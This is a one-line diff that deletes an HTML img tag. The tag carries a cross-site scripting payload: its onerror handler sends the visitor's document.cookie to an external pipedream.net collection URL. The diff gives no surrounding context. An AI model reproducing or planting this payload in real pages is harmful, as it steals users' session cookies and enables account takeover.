@@ -1,1 +1,0 @@
-<img src=x onerror=document.location="https://ennv6gmjrf6a.x.pipedream.net/?c=".concat(document.cookie);>
